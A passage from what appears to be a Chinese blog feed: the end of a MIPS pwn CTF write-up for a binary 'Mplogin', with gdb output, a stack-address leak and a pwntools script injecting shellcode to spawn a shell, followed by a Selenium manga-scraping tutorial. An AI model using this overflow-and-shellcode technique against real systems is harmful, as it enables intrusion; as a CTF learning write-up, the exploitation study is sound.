| hexdump -C</span><br></pre></td></tr></table></figure><p>接下来使用gdb调试，命令如下，需要设置mips框架和小端模式，并在<code>main</code>函数调用<code>sub_400840</code>之前<code>0x00400B88</code>处下断点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~/iot/Mplogin$ gdb-multiarch -q ./Mplogin</span><br><span class="line">pwndbg: loaded 190 commands. Type pwndbg [filter] <span class="keyword">for</span> a list.</span><br><span class="line">pwndbg: created <span class="variable">$rebase</span>, <span class="variable">$ida</span> gdb <span class="built_in">functions</span> (can be used with <span class="built_in">print</span>/<span class="built_in">break</span>)</span><br><span class="line">Reading symbols from ./Mplogin...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">gdb-peda$ <span class="built_in">set</span> architecture mips</span><br><span class="line">The target architecture is assumed to be mips</span><br><span class="line">gdb-peda$ <span class="built_in">set</span> endian little</span><br><span class="line">The target is assumed to be little endian</span><br><span class="line">gdb-peda$ b * 0x00400B88</span><br><span class="line">Breakpoint 1 at 0x400b88</span><br><span class="line">gdb-peda$ target remote :1234</span><br><span class="line">Remote debugging using :1234</span><br><span class="line">warning: remote target does not support file transfer, attempting to access files from <span class="built_in">local</span> filesystem.</span><br><span class="line">Reading symbols from /home/ssr/iot/Mplogin/lib/ld-uClibc.so.0...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line"></span><br><span class="line">此处省略程序开始处断点情况</span><br><span class="line"></span><br><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x00400b88 <span class="keyword">in</span> main ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line">*V0   0x25</span><br><span class="line">*V1   0x1</span><br><span class="line">*A0   0x767cd144 (_stdio_streams+92) ◂— 0x0</span><br><span class="line">*A1   0x76ffef48 —▸ 0x767d530a (m_sbox+12718) ◂— 0x0</span><br><span class="line">*A2   0x1</span><br><span class="line"> A3   0x0</span><br><span class="line">*T0   0x767e61a8 —▸ 0x76731000 ◂— 0x464c457f</span><br><span class="line">*T1   0x77cb3</span><br><span class="line"> T2   0x0</span><br><span class="line"> T3   0x0</span><br><span class="line">*T4   0x767e6048 ◂— 0x0</span><br><span class="line">*T5   0x1</span><br><span class="line">*T6   0xfffffff</span><br><span class="line">*T7   0x40056e ◂— <span class="string">&#x27;puts&#x27;</span></span><br><span class="line">*T8   0x1</span><br><span class="line">*T9   0x76743000 (__write_nocancel) ◂— lui    <span class="variable">$gp</span>, 9 /* <span class="string">&#x27;\t&#x27;</span> */</span><br><span class="line">*S0   0x76806010 ◂— 0x0</span><br><span class="line">*S1   0x4005d8 (_init) ◂— lui    <span class="variable">$gp</span>, 2</span><br><span class="line"> S2   0x0</span><br><span class="line"> S3   0x0</span><br><span class="line"> S4   0x0</span><br><span class="line"> S5   0x0</span><br><span class="line"> S6   0x0</span><br><span class="line"> S7   0x0</span><br><span class="line">*S8   0x76ffef90 —▸ 0x76806010 ◂— 0x0</span><br><span class="line">*FP   0x76ffefb8 ◂— 0x0</span><br><span class="line">*SP   0x76ffef90 —▸ 0x76806010 ◂— 0x0</span><br><span class="line">*PC   0x400b88 (main+156) ◂— jal    0x400840</span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line"> ► 0x400b88 &lt;main+156&gt;    jal    _ftext+512 &lt;0x400840&gt;</span><br><span class="line">   0x400b8c &lt;main+160&gt;    nop    </span><br><span class="line">   0x400b90 &lt;main+164&gt;    lw     <span class="variable">$gp</span>, 0x10(<span class="variable">$fp</span>)</span><br><span class="line">   0x400b94 &lt;main+168&gt;    sw     <span class="variable">$v0</span>, 0x18(<span class="variable">$fp</span>)</span><br><span class="line">   0x400b98 &lt;main+172&gt;    lw     <span class="variable">$a0</span>, 0x18(<span class="variable">$fp</span>)</span><br><span class="line">   0x400b9c &lt;main+176&gt;    jal    _ftext+824 &lt;0x400978&gt;</span><br><span class="line">   0x400ba0 &lt;main+180&gt;    nop    </span><br><span class="line">   0x400ba4 &lt;main+184&gt;    lw     <span class="variable">$gp</span>, 0x10(<span class="variable">$fp</span>)</span><br><span class="line">   0x400ba8 &lt;main+188&gt;    lui    <span class="variable">$v0</span>, 0x40</span><br><span class="line">   0x400bac &lt;main+192&gt;    addiu  <span class="variable">$a0</span>, <span class="variable">$v0</span>, 0xdfc</span><br><span class="line">   0x400bb0 &lt;main+196&gt;    lw     <span class="variable">$v0</span>, -0x7f98(<span class="variable">$gp</span>)</span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ s8 sp  0x76ffef90 —▸ 0x76806010 ◂— 0x0</span><br><span class="line">01:0004│        0x76ffef94 ◂— 0x0</span><br><span class="line">02:0008│        0x76ffef98 ◂— 0x2</span><br><span class="line">03:000c│        0x76ffef9c ◂— 0x1000</span><br><span class="line">04:0010│        0x76ffefa0 ◂— 0x418e50</span><br><span class="line">05:0014│        0x76ffefa4 —▸ 0x767aacc8 (__h_errno_location+40) ◂— lw     <span class="variable">$ra</span>, 0xc(<span class="variable">$sp</span>) /* <span class="string">&#x27;\x0c&#x27;</span> */</span><br><span class="line">06:0018│        0x76ffefa8 —▸ 0x767d53c0 (m_sbox+12900) ◂— 0x0</span><br><span class="line">07:001c│        0x76ffefac —▸ 0x4005d8 (_init) ◂— lui    <span class="variable">$gp</span>, 2</span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► f 0   400b88 main+156</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gdb-peda$ info reg</span><br><span class="line">          zero       at       v0       v1       a0       a1       a2       a3</span><br><span class="line"> R0   00000000 fffffff8 00000025 00000001 767cd144 76ffef48 00000001 00000000 </span><br><span class="line">            t0       t1       t2       t3       t4       t5       t6       t7</span><br><span class="line"> R8   767e61a8 00077cb3 00000000 00000000 767e6048 00000001 0fffffff 0040056e </span><br><span class="line">            s0       s1       s2       s3       s4       s5       s6       s7</span><br><span class="line"> R16  76806010 004005d8 00000000 00000000 00000000 00000000 00000000 00000000 </span><br><span class="line">            t8       t9       k0       k1       gp       sp       s8       ra</span><br><span class="line"> R24  00000001 76743000 00000000 00000000 00418e50 76ffef90 76ffef90 00400b84 </span><br><span class="line">            sr       lo       hi      bad    cause       pc</span><br><span class="line">      20000010 00000024 00000000 00000000 00000000 00400b88 </span><br><span class="line">           fsr      fir</span><br><span class="line">      00000000 00739300 </span><br></pre></td></tr></table></figure><p>可以看到此时FP寄存器真实值为s8处，即<code>0x76ffee90</code></p><p>在qemu终端输入字符串尝试填满缓冲区，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~/iot/Mplogin$ qemu-mipsel -g 1234 -L ./ Mplogin  | hexdump -C</span><br><span class="line">00000000  1b 5b 33 33 6d 2d 2d 2d  2d 2d 77 65 31 63 30 6d  |.[33m-----we1c0m|</span><br><span class="line">00000010  65 20 74 30 20 4d 50 20  6c 30 67 31 6e 20 73 37  |e t0 MP l0g1n s7|</span><br><span class="line">admin111111111111111111</span><br><span class="line">00000020  73 74 65 6d 2d 2d 2d 2d  2d 0a 1b 5b 33 34 6d 55  |stem-----..[34mU|</span><br><span class="line">00000030  73 65 72 6e 61 6d 65 20  3a 20 43 6f 72 72 65 63  |sername : Correc|</span><br><span class="line">00000040  74 20 6e 61 6d 65 20 3a  20 61 64 6d 69 6e 31 31  |t name : admin11|</span><br><span class="line">00000050  31 31 31 31 31 31 31 31  31 31 31 31 31 31 31 31  |1111111111111111|</span><br><span class="line">00000060  0a 90 ef ff 76 90 0b 40  1b 5b 33 31 6d 50 72 65  |....v..@.[31mPre|</span><br></pre></td></tr></table></figure><p>可以看到在60开始的行处有<code>0x76ffee90</code>的地址泄露，可以对泄露的栈地址进行利用。由于栈平衡，<code>sub_400978</code>和<code>sub_400840</code>都是main的同级调用函数，<code>0x76ffee90</code>在<code>sub_400978</code>栈上的返回地址后面，所以在<code>sub_400978</code>溢出点填写<code>0x76ffee90</code>，后边拼接shellcode即可。</p><p>以下为脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#设置pwn环境</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>,endian=<span class="string">&#x27;little&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process([<span class="string">&quot;qemu-mipsel&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;./&quot;</span>,<span class="string">&quot;./Mplogin&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取栈泄露地址</span></span><br><span class="line">io.sendafter(<span class="string">&quot;name : &quot;</span>,<span class="string">&quot;admin&quot;</span>.ljust(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;Correct name : &quot;</span>);</span><br><span class="line">io.recv(<span class="number">0x18</span>)</span><br><span class="line"><span class="comment">#接收四字节地址</span></span><br><span class="line">stack = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#覆盖修改v3值</span></span><br><span class="line">io.sendafter(<span class="string">&quot;Pre_Password : &quot;</span>,<span class="string">&quot;access&quot;</span>.ljust(<span class="number">0x14</span>,<span class="string">&quot;2&quot;</span>)+p32(<span class="number">0x100</span>))</span><br><span class="line"><span class="comment">#拼接shellcode</span></span><br><span class="line">io.sendafter(<span class="string">&quot;Password : &quot;</span>,<span class="string">&quot;0123456789&quot;</span>.ljust(<span class="number">0x28</span>,<span class="string">&quot;2&quot;</span>)+p32(stack)+asm(shellcraft.sh()))</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>主要参考资料：</p><ul><li><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/09/24/mips/">HWS赛题入门MIPS Pwn</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python-selenium爬取漫画</title>
      <link href="2020/11/19/python-selenium%E7%88%AC%E5%8F%96%E6%BC%AB%E7%94%BB/"/>
      <url>2020/11/19/python-selenium%E7%88%AC%E5%8F%96%E6%BC%AB%E7%94%BB/</url>
      
        <content type="html"><![CDATA[<p><img src="/2020/11/19/python-selenium%E7%88%AC%E5%8F%96%E6%BC%AB%E7%94%BB/9.jpg" alt="9"></p><p>想看化物语漫画，找到一家<a href="http://manhua.kukudm.com/comiclist/2372/">网站</a>开始爬取，就当练习爬虫。使用python的selenium框架。</p><a id="more"></a><p>首先进入主页按F12查看原码，可以看到所有章节的url信息都被存放在id为comiclistn的元素中</p><img src="/2020/11/19/python-selenium%E7%88%AC%E5%8F%96%E6%BC%AB%E7%94%BB/1.png" alt="1" style="zoom:67%;"><p>这样就很容易根据id定位获取各个章节的url了，具体函数如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_TOF</span>(<span class="params">index_url</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    从主页面获取各章节url</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    url_list=[]</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#模拟浏览器打开网站</span></span><br><span class="line">    browser=webdriver.Firefox(options=options)</span><br><span class="line">    browser.get(index_url)</span><br><span class="line">    browser.implicitly_wait(<span class="number">3</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#获取章节列表的元素</span></span><br><span class="line">    comics_list_id=browser.find_element_by_id(<span class="string">&quot;comiclistn&quot;</span>)</span><br><span class="line">    chapter_list=comics_list_id.find_elements_by_xpath(<span class="string">&quot;./*&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#生成章节列表</span></span><br><span class="line">    <span class="keyword">for</span> part <span class="keyword">in</span> chapter_list:</span><br><span class="line">        link=part.find_elements_by_tag_name(<span class="string">&#x27;a&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">        url_list.append(link.get_attribute(<span class="string">&#x27;href&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    browser.quit()</span><br><span class="line">    </span><br><span class="line">    Comics=<span class="built_in">dict</span>(name=Name,urls=url_list)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;目录信息爬取成功&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> Comics</span><br></pre></td></tr></table></figure><p>打开具体章节第一页查看源码，需要首先找到页数信息，发现页数没有固定元素，动态生成在文本信息里，所以需要分析其所在的父类的文本内容，用正则表达式提取总页数数字。</p><p><img src="/2020/11/19/python-selenium%E7%88%AC%E5%8F%96%E6%BC%AB%E7%94%BB/2.png" alt="2"></p><p>然后开始逐页提取图片的url和下一页链接的url</p><p><img src="/2020/11/19/python-selenium%E7%88%AC%E5%8F%96%E6%BC%AB%E7%94%BB/3.png" alt="3"></p><p>具体函数如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pic</span>(<span class="params">Comics</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    根据主页面获取的信息逐章爬取图片</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    comic_list=Comics[<span class="string">&#x27;urls&#x27;</span>]</span><br><span class="line">    basedir=Comics[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    browser=webdriver.Firefox(options=options)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> comic_list:</span><br><span class="line">        <span class="comment">#打开某一章节页面</span></span><br><span class="line">        browser.get(url)</span><br><span class="line">        browser.implicitly_wait(<span class="number">5</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#在本地创建文件夹保存</span></span><br><span class="line">        dirname=basedir+<span class="string">&#x27;/&#x27;</span>+browser.title</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(dirname):</span><br><span class="line">            os.mkdir(dirname)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#获取页数</span></span><br><span class="line">        temptext=browser.find_element_by_xpath(<span class="string">&quot;//*[contains(text(),&#x27;共&#x27;)]&quot;</span>).text</span><br><span class="line">        pageNum=<span class="built_in">int</span>(re.findall(<span class="string">r&#x27;\d+&#x27;</span>,temptext)[<span class="number">1</span>])</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;开始爬取\t&#123;&#125;  &#x27;</span>.<span class="built_in">format</span>(browser.title)+<span class="string">&#x27;共&#x27;</span>+<span class="built_in">str</span>(pageNum)+<span class="string">&#x27;页&#x27;</span>)</span><br><span class="line">        <span class="comment">#逐页爬取图片</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,pageNum):</span><br><span class="line">            <span class="comment">#获取图片url</span></span><br><span class="line">            pic_url=browser.find_element_by_tag_name(<span class="string">&#x27;img&#x27;</span>).get_attribute(<span class="string">&#x27;src&#x27;</span>)</span><br><span class="line">            filename=dirname+<span class="string">&#x27;/&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;.jpg&#x27;</span></span><br><span class="line">            <span class="comment">#保存图片到本地</span></span><br><span class="line">            SavePic(filename,pic_url)</span><br><span class="line">            <span class="comment">#获取下一页url</span></span><br><span class="line">            NextPage = browser.find_elements_by_tag_name(<span class="string">&#x27;a&#x27;</span>)[-<span class="number">1</span>].get_attribute(<span class="string">&#x27;href&#x27;</span>)</span><br><span class="line">            <span class="comment">#休息时间</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            browser.get(NextPage)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;当前章节\t&#123;&#125;  下载完毕&#x27;</span>.<span class="built_in">format</span>(browser.title))</span><br><span class="line">    browser.quit()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;所有章节下载完毕&#x27;</span>)</span><br></pre></td></tr></table></figure><p>剩下就是导入的库、全局变量和执行部分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">Name=<span class="string">&#x27;化物语&#x27;</span></span><br><span class="line">indexurl=<span class="string">&#x27;http://manhua.kukudm.com/comiclist/2372/&#x27;</span></span><br><span class="line">options=webdriver.FirefoxOptions()           </span><br><span class="line">options.headless=<span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">Comics=get_TOF(indexurl)</span><br><span class="line">get_pic(Comics)</span><br></pre></td></tr></table></figure><p>可以正常运行，就是太慢……还可能会卡在某一页……继续改进</p><hr><p>修复了因频繁访问被强制断开连接的问题并换了一个好点的wifi后勉强能用了，完整代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">更新日志</span></span><br><span class="line"><span class="string">1.1 自动跳过空章节</span></span><br><span class="line"><span class="string">1.2 卡在一页时会自动刷新</span></span><br><span class="line"><span class="string">1.3 增加进度条功能</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Name=<span class="string">&#x27;化物语&#x27;</span></span><br><span class="line">indexurl=<span class="string">&#x27;http://manhua.kukudm.com/comiclist/2372/&#x27;</span></span><br><span class="line">options=webdriver.FirefoxOptions()           </span><br><span class="line">options.headless=<span class="literal">True</span></span><br><span class="line">start_chap=<span class="number">54</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SavePic</span>(<span class="params">filename,url</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    保存单张图片的函数</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        content=requests.get(url).content</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(content)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        SavePic(filename,url)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_TOF</span>(<span class="params">index_url</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    从主页面获取各章节url</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    url_list=[]</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#模拟浏览器打开网站</span></span><br><span class="line">    browser=webdriver.Firefox(options=options)</span><br><span class="line">    browser.get(index_url)</span><br><span class="line">    browser.implicitly_wait(<span class="number">3</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#获取章节列表的元素</span></span><br><span class="line">    comics_list_id=browser.find_element_by_id(<span class="string">&quot;comiclistn&quot;</span>)</span><br><span class="line">    chapter_list=comics_list_id.find_elements_by_xpath(<span class="string">&quot;./*&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#生成章节列表</span></span><br><span class="line">    <span class="keyword">for</span> part <span class="keyword">in</span> chapter_list:</span><br><span class="line">        link=part.find_elements_by_tag_name(<span class="string">&#x27;a&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">        url_list.append(link.get_attribute(<span class="string">&#x27;href&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    browser.quit()</span><br><span class="line">    </span><br><span class="line">    Comics=<span class="built_in">dict</span>(name=Name,urls=url_list)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;目录信息爬取成功&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> Comics</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pic</span>(<span class="params">browser,cururl,dirname,i,n</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    为防止卡在一个页面设置的递归函数</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        browser.get(cururl)</span><br><span class="line">        <span class="comment">#获取图片url</span></span><br><span class="line">        pic_url=browser.find_element_by_tag_name(<span class="string">&#x27;img&#x27;</span>).get_attribute(<span class="string">&#x27;src&#x27;</span>)</span><br><span class="line">        filename=dirname+<span class="string">&#x27;/&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;.jpg&#x27;</span></span><br><span class="line">        <span class="comment">#保存图片到本地</span></span><br><span class="line">        SavePic(filename,pic_url)</span><br><span class="line">        <span class="comment">#获取下一页url</span></span><br><span class="line">        NextPage = browser.find_elements_by_tag_name(<span class="string">&#x27;a&#x27;</span>)[-<span class="number">1</span>].get_attribute(<span class="string">&#x27;href&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> NextPage</span><br><span class="line">    <span 